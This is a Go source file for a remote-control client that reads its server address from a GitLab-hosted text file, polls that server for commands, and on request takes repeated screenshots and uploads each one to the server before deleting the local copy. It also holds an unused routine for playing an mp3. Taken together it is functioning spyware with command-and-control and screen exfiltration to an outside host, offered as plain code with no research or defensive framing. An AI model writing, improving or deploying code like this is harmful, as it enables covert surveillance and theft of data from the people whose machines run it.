package main

import (
	"fmt"
	"image/png"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
	"sync"
	"github.com/vova616/screenshot"
	"github.com/ebitengine/oto/v3"
    "github.com/hajimehoshi/go-mp3"
)

var serverIp string = "unknown"
var userInput string = ""
var mutex sync.Mutex

func fetchTunnelURL() string {
    resp, err := http.Get(fmt.Sprintf("https://gitlab.com/Plexisity1/tunnel-url/-/raw/main/tunnel-url.txt"))
    if err != nil {
        fmt.Println("Error fetching gist:", err)
        return ""
    }
    defer resp.Body.Close()

    body, err := io.ReadAll(resp.Body)
    if err != nil {
        fmt.Println("Error reading gist:", err)
        return ""
    }

    return strings.TrimSpace(string(body))
}

func ss() {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		fmt.Println("Error capturing screenshot:", err)
		panic(err)
	}
	f, err := os.Create("./ss.webp")
	if err != nil {
		fmt.Println("Error creating file:", err)
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		fmt.Println("Error encoding PNG:", err)
		panic(err)
	}
	f.Close()
}

func sendFile(filePath string, mediaType string) string {
	Path := filePath
	file, err := os.Open(Path)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	// Prepare the network request targeting the cloudflare ip
	targetURL := serverIp + "/upload"
	req, err := http.NewRequest("POST", targetURL, file)
	if err != nil {
		panic(err)
	}

	// Attach metadata instructions in the headers
	req.Header.Set("X-Media-Type", mediaType)
	req.Header.Set("X-File-Name", Path)

	// Dispatch the stream
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	os.Remove(Path)
	var output string = "Server Response Status: " + resp.Status
	return (output)
}

func fetchCommand() string {

	resp, err := http.Get(serverIp + "/get-command")
	if err != nil {
		fmt.Println("Error connecting to server:", err)
		return "idle"
	}

	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return "idle"
	}

	return string(bodyBytes)
}

// command to play sounds the server defines built for mp3
func playSound() {
	file, err := os.Open("./sound.mp3")
    if err != nil {
        panic("opening sound.mp3 failed: " + err.Error())
    }

    decodedMp3, err := mp3.NewDecoder(file)
    if err != nil {
        panic("mp3.NewDecoder failed: " + err.Error())
    }

	op := &oto.NewContextOptions{}
    op.SampleRate = 44100
    op.ChannelCount = 2
    op.Format = oto.FormatSignedInt16LE
    otoCtx, readyChan, err := oto.NewContext(op)
    if err != nil {
        panic("oto.NewContext failed: " + err.Error())
    }

    <-readyChan
    player := otoCtx.NewPlayer(decodedMp3)
    player.Play()

    for player.IsPlaying() {
        time.Sleep(time.Millisecond)
    }
}

func main() {
	fmt.Println("Finding tunnel URL...")
	tunnelURL := fetchTunnelURL()	
	mutex.Lock()
	serverIp = tunnelURL
	mutex.Unlock()

	fmt.Println("Tunnel URL fetched:", tunnelURL)
	fmt.Println("Starting command client...")

	for true {
		userInput = fetchCommand()
		command := strings.Fields(userInput)
		time.Sleep(2 * time.Second)
		fmt.Printf("Received command from server: %s\n", userInput)

		switch command[0] {

		case "idle":
			time.Sleep(5 * time.Second)

		case "ss":
			i := 0
			fmt.Println("Using numeric value")

			n, err := strconv.Atoi(command[1])

			if err != nil {
				fmt.Println(err)
			}

			for i < n {
				ss()
				output := sendFile("./ss.webp", "image")
				fmt.Println(output)
				time.Sleep(500 * time.Millisecond)
				fmt.Println(i)
				i++
			}


		default:
			time.Sleep(2 * time.Second)

			if strings.HasPrefix(userInput, "error") {
			fmt.Println("Server down, looking for new tunnel URL...")
			tunnelURL = fetchTunnelURL()
			time.Sleep(10 * time.Second)
			mutex.Lock()
			serverIp = tunnelURL
			mutex.Unlock()
			fmt.Println("Tunnel URL fetched:", tunnelURL)
			}

		}
	}
}
